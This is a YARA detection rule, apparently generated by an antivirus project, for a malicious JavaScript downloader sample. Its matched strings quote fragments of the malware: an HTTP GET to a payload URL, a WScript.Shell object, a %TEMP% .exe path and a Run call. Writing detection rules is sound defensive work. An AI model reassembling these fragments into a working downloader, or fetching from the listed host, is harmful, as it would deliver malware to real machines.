rule sig_20160330_3ab6f4c0a17ca289cdf855536bedc359 {
  meta:
    description = "datamaliciousorder - file 20160330_3ab6f4c0a17ca289cdf855536bedc359.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a776f6320d52e514d3c7f6254e1b5d77468123f02a995554272dc001bcb7634a"

  strings:
    $s1  = "_Q1[_TL](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "var _NB = function _TN() {return WScript[_I](\"WScript\"+\".Shell\");}(), _I0 = 11;" fullword ascii
    $s3  = "function _JN(_U0, _U1){_AS = _AS * 1; return _U0 - _U1;};" fullword ascii
    $s4  = "if (_Q1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _P() {return _NB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"s5C3dPdFTy.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Q(){return _U + \"\";};" fullword ascii
    $s7  = "function _O() {return ((_K1 == true) && (_K1 == _P0)) ? 1 : _AS;};" fullword ascii
    $s8  = "function _VW(_S){_NB[\"Run\"](_S, _AS, _AS);};" fullword ascii
    $s9  = "function _K()" fullword ascii
    $s10 = "return _JN(_K0, _QT0);" fullword ascii
    $s11 = "var _EC = new this[\"Date\"]();" fullword ascii
    $s12 = "function _JE(){return 22;};" fullword ascii
    $s13 = "function _G(){return _I;};" fullword ascii
    $s14 = "function _Y(_JJ) {var _H = (1, 2, 3, 4, 5, _JJ); return _H;};" fullword ascii
    $s15 = " while (_OR){" fullword ascii
    $s16 = "_P0 = true; " fullword ascii
    $s17 = "var _P0 = false;" fullword ascii
    $s18 = "var _K2 = false;" fullword ascii
    $s19 = "var _K1 = false;" fullword ascii
    $s20 = "_K1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}